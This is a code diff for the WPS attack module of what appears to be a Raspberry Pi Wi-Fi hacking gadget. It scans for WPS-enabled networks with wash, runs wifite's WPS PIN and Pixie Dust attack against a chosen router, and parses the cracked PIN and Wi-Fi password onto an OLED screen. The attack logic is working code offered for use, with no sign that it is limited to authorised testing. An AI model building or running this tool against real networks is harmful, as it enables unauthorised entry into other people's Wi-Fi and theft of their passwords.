@@ -6,6 +6,8 @@ import subprocess
 import time
 import queue
 import threading
+import pty
+import select
 import RPi.GPIO as GPIO
 
 import config
@@ -15,19 +17,12 @@ CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 
 # ------------------------------------------------------------------ #
-#  UTILIDADES COMPARTIDAS                                            #
+#  UTILIDADES                                                        #
 # ------------------------------------------------------------------ #
 def clean_ansi(text):
-    """Elimina códigos de escape ANSI (colores de terminal)."""
+    """Elimina códigos de escape ANSI y normaliza retornos de carro."""
     ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-    return ansi_escape.sub('', text)
-
-
-def enqueue_output(out, q):
-    """Hilo secundario para leer la salida de subprocesos sin bloquear la UI."""
-    for line in iter(out.readline, ''):
-        q.put(line)
-    out.close()
+    return ansi_escape.sub('', text).replace('\r', '\n')
 
 
 def stop_process(proc):
@@ -35,8 +30,36 @@ def stop_process(proc):
     if proc and proc.poll() is None:
         try:
             os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            time.sleep(0.3)
+            if proc.poll() is None:
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
         except Exception:
             pass
+
+
+def pty_reader(master_fd, out_queue, stop_event):
+    """Lee la salida de la PTY y la mete en la cola (evita buffering)."""
+    while not stop_event.is_set():
+        try:
+            r, _, _ = select.select([master_fd], [], [], 0.3)
+            if master_fd in r:
+                try:
+                    data = os.read(master_fd, 4096)
+                except OSError:
+                    break
+                if not data:
+                    break
+                text = clean_ansi(data.decode("utf-8", errors="ignore"))
+                for chunk in text.split("\n"):
+                    chunk = chunk.strip()
+                    if chunk:
+                        out_queue.put(chunk)
+        except Exception:
+            break
+    try:
+        os.close(master_fd)
+    except Exception:
+        pass
 
 
 # ------------------------------------------------------------------ #
@@ -45,22 +68,19 @@ def stop_process(proc):
 def scan_wps_networks(interfaz=None, tiempo_escaneo=12):
     """
     Ejecuta 'wash' durante N segundos y parsea las redes con WPS activo.
-    Devuelve una lista de dicts: bssid, essid, ch, signal, locked, vendor.
+    Devuelve lista de dicts: bssid, essid, ch, signal, locked, vendor.
     """
     if interfaz is None:
         interfaz = config.INTERFACE
 
-    oled_menu.show_message("ESCANEANDO WPS", "Ejecutando wash...", "Espere un momento")
+    oled_menu.show_message("ESCANEANDO WPS", "Ejecutando wash...",
+                           "Espere un momento")
 
-    # 'timeout' nos asegura que wash muera solo, sin dejar la interfaz bloqueada
     cmd = f"sudo timeout {tiempo_escaneo} wash -i {interfaz}"
 
     try:
         resultado = subprocess.run(
-            cmd,
-            shell=True,
-            capture_output=True,
-            text=True,
+            cmd, shell=True, capture_output=True, text=True,
             timeout=tiempo_escaneo + 5,
         )
         stdout = resultado.stdout or ""
@@ -94,41 +114,101 @@ def scan_wps_networks(interfaz=None, tiempo_escaneo=12):
                 "vendor": vendor,
             })
 
-    # Ordenar por potencia de señal (más fuerte primero)
     redes.sort(key=lambda r: r["signal"], reverse=True)
     return redes
 
 
 # ------------------------------------------------------------------ #
-#  ATAQUE WPS CON WIFITE                                             #
+#  LANZAR WIFITE WPS CON PTY                                         #
 # ------------------------------------------------------------------ #
 def run_wifite_wps(target_bssid):
-    """
-    Lanza wifite en modo WPS-only contra el BSSID indicado.
-    Wifite por debajo usa reaver/bully para el ataque de PIN.
-    """
+    """Lanza wifite en modo WPS con PTY. Devuelve (proc, master_fd)."""
     cmd = [
         "sudo", "wifite",
         "-i", config.INTERFACE,
         "-b", target_bssid,
-        "--wps-only",     # solo WPS (sin handshake / PMKID)
+        "--wps-only",
         "--no-pmkid",
         "--kill",
     ]
-    return subprocess.Popen(
+
+    master, slave = pty.openpty()
+
+    proc = subprocess.Popen(
         cmd,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True,
+        stdin=slave,
+        stdout=slave,
+        stderr=slave,
         preexec_fn=os.setsid,
+        close_fds=True,
     )
+    os.close(slave)
+
+    return proc, master
 
 
 # ------------------------------------------------------------------ #
-#  BUCLE PRINCIPAL (MENÚ OLED + 3 BOTONES)                           #
+#  CLASIFICADOR DE FASES                                             #
+# ------------------------------------------------------------------ #
+_PATRONES_FASE = [
+    # Fin / éxito
+    ("FINALIZADO", re.compile(r"finished|exiting|quitting|stopping",
+                              re.IGNORECASE)),
+    # PSK obtenida (fin del ataque con éxito)
+    ("PSK_OK",     re.compile(r"wps.*psk|psk.*found|cracked.*psk",
+                              re.IGNORECASE)),
+    # PIN encontrado
+    ("PIN_OK",     re.compile(r"wps pin|cracked.*pin|pin.*found|pin.*[:=]",
+                              re.IGNORECASE)),
+    # Pixie Dust
+    ("PIXIE",      re.compile(r"pixie|pixiewps|pixie-dust", re.IGNORECASE)),
+    # Probando PINs
+    ("PROBANDO",   re.compile(r"trying pin|testing pin|pin.*attempt|"
+                              r"brute.*pin|sending.*pin", re.IGNORECASE)),
+    # Bloqueado
+    ("BLOQUEADO",  re.compile(r"wps.*lock|ap.*lock|locked.*wps|ratelimit",
+                              re.IGNORECASE)),
+    # Escaneando
+    ("ESCANEANDO", re.compile(r"scan|looking for|enumerating|found \d+ "
+                              r"(wps|ap|client)", re.IGNORECASE)),
+]
+
+_ORDEN = {
+    "ESCANEANDO": 1,
+    "PROBANDO":   2,
+    "PIXIE":      3,
+    "BLOQUEADO":  4,
+    "PIN_OK":     5,
+    "PSK_OK":     6,
+    "FINALIZADO": 7,
+}
+
+# Texto que se muestra en la OLED para cada fase
+_TEXTO_FASE = {
+    "ESCANEANDO": "Escaneando red",
+    "PROBANDO":   "Probando PIN",
+    "PIXIE":      "Pixie Dust",
+    "BLOQUEADO":  "AP bloqueado",
+    "PIN_OK":     "PIN encontrado",
+    "PSK_OK":     "Clave encontrada",
+    "FINALIZADO": "Finalizando...",
+}
+
+
+def _detectar_fase(line, fase_actual):
+    """Devuelve la fase según la línea. Solo avanza, nunca retrocede."""
+    for nombre, patron in _PATRONES_FASE:
+        if patron.search(line):
+            if _ORDEN[nombre] >= _ORDEN.get(fase_actual, 0):
+                return nombre
+    return fase_actual
+
+
+# ------------------------------------------------------------------ #
+#  BUCLE PRINCIPAL                                                   #
 # ------------------------------------------------------------------ #
 def start_wps_attack_loop():
-    """Bucle principal del módulo WPS con UI normalizada (igual que handshake)."""
+    """Bucle principal del módulo WPS con UI normalizada."""
     if not config.INTERFACE:
         oled_menu.show_message("ERROR INTERFAZ", "No hay tarjeta", "en modo monitor")
         time.sleep(2)
@@ -146,19 +226,32 @@ def start_wps_attack_loop():
         items_menu.append("Sin redes WPS")
 
     estado = "LISTA"
-    index = 0
-    wifite_proc = None
-    out_queue = None
+    index  = 0
     target = None
+
+    wifite_proc = None
+    out_queue   = None
+    reader_stop = None
 
     pin_final = ""
     psk_final = ""
+    fase      = "ESCANEANDO"
+
+    # Regex de captura
+    RE_PIN = re.compile(
+        r"(?:WPS PIN|Cracked WPS PIN|PIN)\s*[:=]\s*['\"]?(\d{4,8})",
+        re.IGNORECASE,
+    )
+    RE_PSK = re.compile(
+        r"(?:WPS PSK|Cracked WPS PSK|PSK|KEY)\s*[:=]\s*(.+)$",
+        re.IGNORECASE,
+    )
 
     try:
         while True:
-            # ---------------------------------------------- #
-            # ESTADO 1: MENÚ DE SELECCIÓN                     #
-            # ---------------------------------------------- #
+            # ==================================================== #
+            # ESTADO 1: MENÚ DE SELECCIÓN                          #
+            # ==================================================== #
             if estado == "LISTA":
                 oled_menu.draw_menu("WPS ATTACK", items_menu, index)
 
@@ -178,6 +271,7 @@ def start_wps_attack_loop():
                         target = wifi_list[index - 1]
                         pin_final = ""
                         psk_final = ""
+                        fase      = "ESCANEANDO"
 
                         if target["locked"]:
                             oled_menu.show_message(
@@ -193,111 +287,140 @@ def start_wps_attack_loop():
                             "Buscando PIN..."
                         )
 
-                        wifite_proc = run_wifite_wps(target["bssid"])
+                        # Lanzar wifite con PTY
+                        wifite_proc, master_fd = run_wifite_wps(target["bssid"])
 
-                        out_queue = queue.Queue()
+                        # Cola + hilo lector
+                        out_queue   = queue.Queue()
+                        reader_stop = threading.Event()
                         t = threading.Thread(
-                            target=enqueue_output,
-                            args=(wifite_proc.stdout, out_queue),
+                            target=pty_reader,
+                            args=(master_fd, out_queue, reader_stop),
+                            daemon=True,
                         )
-                        t.daemon = True
                         t.start()
 
                         estado = "ATACANDO"
-                        time.sleep(0.5)
+                        time.sleep(0.3)
 
-            # ---------------------------------------------- #
-            # ESTADO 2: ATAQUE EN CURSO                       #
-            # ---------------------------------------------- #
+            # ==================================================== #
+            # ESTADO 2: ATAQUE EN CURSO                            #
+            # ==================================================== #
             elif estado == "ATACANDO":
-                try:
-                    line = out_queue.get_nowait()
-                    line_clean = clean_ansi(line.strip())
+                # Procesar toda la cola
+                while True:
+                    try:
+                        line = out_queue.get_nowait()
+                    except queue.Empty:
+                        break
 
-                    # --- Mensajes de progreso en OLED ---
-                    if "Trying PIN" in line_clean or "Trying pin" in line_clean:
-                        pin_try = line_clean.split()[-1][:8]
-                        oled_menu.show_message(
-                            "PROBANDO PIN",
-                            pin_try,
-                            target["essid"][:16]
-                        )
-                    elif "Pixie" in line_clean or "pixie" in line_clean:
-                        oled_menu.show_message(
-                            "PIXIE DUST",
-                            "Ataque offline",
-                            target["essid"][:16]
-                        )
-                    elif "WPS lock" in line_clean or "AP Locked" in line_clean:
-                        oled_menu.show_message(
-                            "AP BLOQUEADO",
-                            "El router bloqueó",
-                            "Reintente luego"
-                        )
+                    # Actualizar fase (solo avanza)
+                    fase = _detectar_fase(line, fase)
 
-                    # --- Captura de PIN ---
-                    m_pin = re.search(
-                        r"(?:WPS PIN|Cracked WPS PIN)[:\s'\"\[]*([0-9]{4,8})",
-                        line_clean, re.IGNORECASE,
-                    )
+                    # Capturar PIN
+                    m_pin = RE_PIN.search(line)
                     if m_pin:
-                        pin_final = m_pin.group(1)
+                        pin_final = m_pin.group(1).strip()
+                        # No forzamos cambio de fase aquí: el PIN puede
+                        # aparecer antes que la PSK, el ataque continúa
+                        # para intentar recuperar la PSK.
 
-                    # --- Captura de PSK (password) ---
-                    m_psk = re.search(
-                        r"(?:WPS PSK|Cracked WPS PSK|PSK)[:\s'\"\[]*([^\s'\"]+)",
-                        line_clean, re.IGNORECASE,
-                    )
+                    # Capturar PSK (prioridad máxima)
+                    m_psk = RE_PSK.search(line)
                     if m_psk:
-                        psk_final = m_psk.group(1)
+                        psk_final = m_psk.group(1).strip().strip("'\"")
+                        if psk_final and len(psk_final) >= 4:
+                            fase = "PSK_OK"
 
-                    # --- Fin del proceso ---
-                    if any(k in line_clean for k in
-                           ["Finished", "exiting", "Quitting", "Stopping"]):
+                    # Fin del ataque
+                    if fase == "FINALIZADO":
                         stop_process(wifite_proc)
+                        if reader_stop:
+                            reader_stop.set()
+                        time.sleep(0.5)
                         estado = "RESULTADO"
+                        break
 
-                except queue.Empty:
-                    pass
+                # --- Render: una sola línea con la fase actual ---
+                if estado == "ATACANDO":
+                    oled_menu.clear_screen()
 
-                # Cancelación manual
+                    # Header invertido con ESSID
+                    oled_menu.draw.rectangle((0, 0, oled_menu.W - 1, 11), fill=255)
+                    oled_menu.draw.text((3, 0), target['essid'][:16],
+                                        font=oled_menu.font_title, fill=0)
+
+                    # Si estamos probando PIN, mostrar el PIN actual
+                    # Si no, mostrar el texto de la fase
+                    if fase == "PROBANDO" and pin_final:
+                        texto = f"PIN: {pin_final}"
+                    else:
+                        texto = _TEXTO_FASE.get(fase, "Trabajando...")
+
+                    tw, _ = oled_menu._text_size(texto, oled_menu.font_title)
+                    x = max(0, (oled_menu.W - tw) // 2)
+                    oled_menu.draw.text((x, 26), texto,
+                                        font=oled_menu.font_title, fill=255)
+
+                    # Footer
+                    oled_menu.draw.text((2, 56), "SELECT: cancelar",
+                                        font=oled_menu.font_small, fill=255)
+
+                    oled_menu.refresh()
+
+                # Cancelación con SELECT
                 if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
+                    time.sleep(0.3)
                     stop_process(wifite_proc)
-                    oled_menu.show_message("CANCELADO", "Ataque detenido", "por usuario")
+                    if reader_stop:
+                        reader_stop.set()
+                    oled_menu.show_message("CANCELADO", "Ataque detenido",
+                                           "por el usuario")
                     time.sleep(1.5)
                     return
 
-            # ---------------------------------------------- #
-            # ESTADO 3: RESULTADOS                            #
-            # ---------------------------------------------- #
+            # ==================================================== #
+            # ESTADO 3: RESULTADO                                  #
+            # ==================================================== #
             elif estado == "RESULTADO":
                 oled_menu.clear_screen()
-                oled_menu.draw.text(
-                    (0, 0), f"RED: {target['essid'][:14]}",
-                    font=oled_menu.font, fill=255
-                )
+
+                # Header invertido
+                oled_menu.draw.rectangle((0, 0, oled_menu.W - 1, 11), fill=255)
+                oled_menu.draw.text((2, 0), f"RED: {target['essid'][:14]}",
+                                    font=oled_menu.font_title, fill=0)
 
                 if psk_final:
-                    oled_menu.draw_wrapped_text(f"KEY: {psk_final}", 16)
+                    # Caso ideal: tenemos la clave WiFi
+                    oled_menu.draw.text((2, 18), "CLAVE:",
+                                        font=oled_menu.font_small, fill=255)
+                    oled_menu.draw_wrapped_text(psk_final, 30, max_chars=20)
+                    if pin_final:
+                        oled_menu.draw.text(
+                            (2, 46), f"PIN: {pin_final}",
+                            font=oled_menu.font_small, fill=255
+                        )
                 elif pin_final:
-                    oled_menu.draw.text(
-                        (0, 20), f"PIN: {pin_final}",
-                        font=oled_menu.font, fill=255
-                    )
-                    oled_menu.draw.text(
-                        (0, 36), "(usar para PSK)",
-                        font=oled_menu.font, fill=255
-                    )
+                    # Solo PIN (usar para calcular PSK por otros medios)
+                    oled_menu.draw.text((2, 18), "PIN WPS:",
+                                        font=oled_menu.font_small, fill=255)
+                    oled_menu.draw.text((2, 30), pin_final,
+                                        font=oled_menu.font_title, fill=255)
+                    oled_menu.draw.text((2, 48), "(sin PSK directa)",
+                                        font=oled_menu.font_small, fill=255)
                 else:
-                    oled_menu.draw.text(
-                        (0, 20), "Sin resultado",
-                        font=oled_menu.font, fill=255
-                    )
+                    # Falló
+                    oled_menu.draw.text((2, 20), "Sin resultado",
+                                        font=oled_menu.font, fill=255)
+                    if target.get("locked"):
+                        oled_menu.draw.text((2, 36), "AP bloqueado WPS",
+                                            font=oled_menu.font_small, fill=255)
+                    else:
+                        oled_menu.draw.text((2, 36), "PIN no encontrado",
+                                            font=oled_menu.font_small, fill=255)
 
-                oled_menu.draw.text(
-                    (0, 54), "SELECT: Volver",
-                    font=oled_menu.font, fill=255
-                )
+                oled_menu.draw.text((2, 52), "SELECT: volver",
+                                    font=oled_menu.font_small, fill=255)
                 oled_menu.refresh()
 
                 if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
@@ -308,6 +431,8 @@ def start_wps_attack_loop():
 
     finally:
         stop_process(wifite_proc)
+        if reader_stop:
+            reader_stop.set()
 
 
 # ------------------------------------------------------------------ #
